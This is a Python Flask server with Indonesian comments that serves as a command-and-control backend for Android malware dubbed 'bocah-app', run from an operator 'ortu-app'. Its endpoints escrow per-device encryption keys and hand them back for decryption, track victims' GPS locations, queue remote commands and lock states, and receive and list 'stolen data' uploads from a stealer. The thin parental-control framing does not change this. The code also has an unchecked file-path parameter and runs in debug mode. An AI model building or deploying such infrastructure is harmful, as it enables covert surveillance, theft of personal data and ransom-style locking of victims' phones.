from flask import Flask, request, jsonify
import json
from datetime import datetime
import os

app = Flask(__name__)

DATA_FILE = 'devices_data.json'
CHAT_FILE = 'chat_messages.json' # File untuk menyimpan pesan chat
STOLEN_DATA_DIR = 'stolen_data' # Direktori untuk menyimpan data curian

# Pastikan direktori dan file ada
if not os.path.exists(STOLEN_DATA_DIR):
    os.makedirs(STOLEN_DATA_DIR)
if not os.path.exists(DATA_FILE):
    with open(DATA_FILE, 'w') as f:
        json.dump({}, f)
if not os.path.exists(CHAT_FILE):
    with open(CHAT_FILE, 'w') as f:
        json.dump([], f)

def load_devices_data():
    with open(DATA_FILE, 'r') as f:
        return json.load(f)

def save_devices_data(data):
    with open(DATA_FILE, 'w') as f:
        json.dump(data, f, indent=4)

def load_chat_messages():
    with open(CHAT_FILE, 'r') as f:
        return json.load(f)

def save_chat_messages(data):
    with open(CHAT_FILE, 'w') as f:
        json.dump(data, f, indent=4)

devices = load_devices_data()
chat_messages = load_chat_messages()

# --- Endpoint untuk bocah-app ---

@app.route('/register_key', methods=['POST'])
def register_key():
    data = request.json
    device_id = data.get('device_id')
    encryption_key = data.get('encryption_key')

    if not device_id or not encryption_key:
        return jsonify({"message": "Device ID atau kunci enkripsi tidak ada"}), 400

    if device_id not in devices:
        devices[device_id] = {
            "encryption_key": encryption_key,
            "last_seen": datetime.now().isoformat(),
            "status": "registered",
            "pending_command": None,
            "current_location": {"latitude": "N/A", "longitude": "N/A", "timestamp": "N/A"},
            "is_device_admin": False, # Status Device Admin
            "is_locked": False        # Status Lock Screen
        }
    else:
        devices[device_id]["encryption_key"] = encryption_key
        devices[device_id]["last_seen"] = datetime.now().isoformat()
        devices[device_id]["status"] = "key_updated"
    
    save_devices_data(devices)
    print(f"[{datetime.now().isoformat()}] Device {device_id} registered/updated key.")
    return jsonify({"message": "Kunci enkripsi terdaftar/diperbarui"}), 200

@app.route('/update_location', methods=['POST'])
def update_location():
    data = request.json
    device_id = data.get('device_id')
    latitude = data.get('latitude')
    longitude = data.get('longitude')

    if not device_id or not latitude or not longitude:
        return jsonify({"message": "Data lokasi tidak lengkap"}), 400
    
    if device_id in devices:
        devices[device_id]["current_location"] = {
            "latitude": latitude,
            "longitude": longitude,
            "timestamp": datetime.now().isoformat()
        }
        devices[device_id]["last_seen"] = datetime.now().isoformat()
        save_devices_data(devices)
        print(f"[{datetime.now().isoformat()}] Device {device_id} location updated: {latitude}, {longitude}")
        return jsonify({"message": "Lokasi diperbarui"}), 200
    else:
        return jsonify({"message": "Device ID tidak ditemukan"}), 404

# NEW: Endpoint untuk bocah-app mengirim pesan chat
@app.route('/send_chat', methods=['POST'])
def send_chat():
    data = request.json
    device_id = data.get('device_id')
    message = data.get('message')

    if not device_id or not message:
        return jsonify({"message": "Device ID atau pesan tidak ada"}), 400
    
    chat_messages.append({
        "device_id": device_id,
        "sender": "anak",
        "message": message,
        "timestamp": datetime.now().isoformat()
    })
    save_chat_messages(chat_messages)
    print(f"[{datetime.now().isoformat()}] Chat from {device_id}: {message}")
    return jsonify({"message": "Pesan chat diterima"}), 200

# NEW: Endpoint untuk bocah-app mengirim data curian (placeholder)
@app.route('/upload_stolen_data', methods=['POST'])
def upload_stolen_data():
    data = request.json
    device_id = data.get('device_id')
    data_type = data.get('data_type', 'generic_stealer')
    payload = data.get('payload') # Ini akan jadi string base64 atau JSON string dari data curian

    if not device_id or not payload:
        return jsonify({"message": "Device ID atau payload tidak ada"}), 400
    
    # Simpan data curian ke file spesifik per device
    file_path = os.path.join(STOLEN_DATA_DIR, f"{device_id}_{data_type}_{datetime.now().strftime('%Y%m%d%H%M%S')}.json")
    try:
        with open(file_path, 'w') as f:
            json.dump({"device_id": device_id, "data_type": data_type, "timestamp": datetime.now().isoformat(), "payload": payload}, f, indent=4)
        print(f"[{datetime.now().isoformat()}] Stolen data ({data_type}) uploaded from {device_id} to {file_path}")
        return jsonify({"message": "Data curian diterima"}), 200
    except Exception as e:
        print(f"[{datetime.now().isoformat()}] Error saving stolen data: {e}")
        return jsonify({"message": "Gagal menyimpan data curian"}), 500


# NEW: Endpoint untuk bocah-app update status Device Admin
@app.route('/update_device_admin_status', methods=['POST'])
def update_device_admin_status():
    data = request.json
    device_id = data.get('device_id')
    is_admin = data.get('is_admin') # Boolean

    if not device_id or is_admin is None:
        return jsonify({"message": "Device ID atau status admin tidak ada"}), 400
    
    if device_id in devices:
        devices[device_id]["is_device_admin"] = is_admin
        devices[device_id]["last_seen"] = datetime.now().isoformat()
        save_devices_data(devices)
        print(f"[{datetime.now().isoformat()}] Device {device_id} Device Admin status updated to: {is_admin}")
        return jsonify({"message": "Status Device Admin diperbarui"}), 200
    else:
        return jsonify({"message": "Device ID tidak ditemukan"}), 404


@app.route('/get_command', methods=['GET'])
def get_command():
    device_id = request.args.get('device_id')

    if not device_id or device_id not in devices:
        return jsonify({"command": "NONE"}), 200

    command_to_send = devices[device_id].get("pending_command")
    
    if command_to_send:
        print(f"[{datetime.now().isoformat()}] Sending command to {device_id}: {command_to_send.get('command')}")
        return jsonify(command_to_send), 200
    
    return jsonify({"command": "NONE"}), 200

@app.route('/clear_command', methods=['POST'])
def clear_command():
    data = request.json
    device_id = data.get('device_id')

    if not device_id or device_id not in devices:
        return jsonify({"message": "Device ID tidak ditemukan"}), 404
    
    devices[device_id]["pending_command"] = None
    save_devices_data(devices)
    print(f"[{datetime.now().isoformat()}] Command cleared for {device_id}.")
    return jsonify({"message": "Perintah dihapus"}), 200

@app.route('/post_status', methods=['POST'])
def post_status():
    data = request.json
    device_id = data.get('device_id')
    status = data.get('status')

    if not device_id or not status:
        return jsonify({"message": "Device ID atau status tidak ada"}), 400

    if device_id in devices:
        devices[device_id]["status"] = status
        devices[device_id]["last_seen"] = datetime.now().isoformat()
        save_devices_data(devices)
        print(f"[{datetime.now().isoformat()}] Device {device_id} status updated to: {status}")
        return jsonify({"message": "Status diperbarui"}), 200
    else:
        return jsonify({"message": "Device ID tidak ditemukan"}), 404

# --- Endpoint untuk ortu-app ---

@app.route('/send_command', methods=['POST'])
def send_command():
    data = request.json
    device_id = data.get('device_id')
    command = data.get('command')
    key_for_decryption = data.get('key_for_decryption')
    
    # NEW: Untuk chat dari ortu ke anak
    chat_message = data.get('chat_message') 

    if not device_id or not command:
        return jsonify({"message": "Device ID atau perintah tidak ada"}), 400

    if device_id in devices:
        command_payload = {"command": command}
        if key_for_decryption:
            command_payload["key_for_decryption"] = key_for_decryption
        if chat_message: # Jika ada pesan chat, tambahkan ke payload
            command_payload["chat_message"] = chat_message
            chat_messages.append({ # Simpan pesan ortu ke C2 juga
                "device_id": device_id,
                "sender": "ortu",
                "message": chat_message,
                "timestamp": datetime.now().isoformat()
            })
            save_chat_messages(chat_messages)
            print(f"[{datetime.now().isoformat()}] Chat from ortu to {device_id}: {chat_message}")

        devices[device_id]["pending_command"] = command_payload
        save_devices_data(devices)
        print(f"[{datetime.now().isoformat()}] Command '{command}' set for {device_id}.")
        return jsonify({"message": "Perintah diatur, menunggu eksekusi perangkat"}), 200
    else:
        return jsonify({"message": "Device ID tidak ditemukan"}), 404

@app.route('/get_key', methods=['GET'])
def get_key():
    device_id = request.args.get('device_id')

    if not device_id or device_id not in devices:
        return jsonify({"message": "Device ID tidak ditemukan atau kunci tidak ada"}), 404
    
    key = devices[device_id].get("encryption_key", "N/A")
    return jsonify({"encryption_key": key}), 200

@app.route('/get_status', methods=['GET'])
def get_status():
    device_id = request.args.get('device_id')

    if not device_id or device_id not in devices:
        return jsonify({"message": "Device ID tidak ditemukan"}), 404
    
    device_info = devices[device_id]
    return jsonify({
        "status": device_info.get("status", "Unknown"),
        "last_seen": device_info.get("last_seen", "N/A"),
        "current_location": device_info.get("current_location", {"latitude": "N/A", "longitude": "N/A", "timestamp": "N/A"}),
        "is_device_admin": device_info.get("is_device_admin", False), # Tambah status Device Admin
        "is_locked": device_info.get("is_locked", False) # Tambah status lock
    }), 200

# NEW: Endpoint untuk ortu-app melihat chat historis
@app.route('/get_chat_history', methods=['GET'])
def get_chat_history():
    device_id = request.args.get('device_id')
    if not device_id:
        return jsonify({"message": "Device ID tidak ada"}), 400
    
    filtered_chats = [chat for chat in chat_messages if chat['device_id'] == device_id]
    return jsonify({"chats": filtered_chats}), 200

# NEW: Endpoint untuk ortu-app melihat data curian per device
@app.route('/get_stolen_data_list', methods=['GET'])
def get_stolen_data_list():
    device_id = request.args.get('device_id')
    if not device_id:
        return jsonify({"message": "Device ID tidak ada"}), 400
    
    stolen_files = []
    for filename in os.listdir(STOLEN_DATA_DIR):
        if filename.startswith(f"{device_id}_") and filename.endswith(".json"):
            stolen_files.append(filename)
    return jsonify({"files": stolen_files}), 200

# NEW: Endpoint untuk ortu-app mengambil konten data curian spesifik
@app.route('/get_stolen_data_content/<filename>', methods=['GET'])
def get_stolen_data_content(filename):
    file_path = os.path.join(STOLEN_DATA_DIR, filename)
    if not os.path.exists(file_path):
        return jsonify({"message": "File tidak ditemukan"}), 404
    
    try:
        with open(file_path, 'r') as f:
            content = json.load(f)
        return jsonify(content), 200
    except Exception as e:
        print(f"[{datetime.now().isoformat()}] Error reading stolen data file: {e}")
        return jsonify({"message": "Gagal membaca konten file"}), 500


@app.route('/devices', methods=['GET'])
def list_devices():
    return jsonify(devices), 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
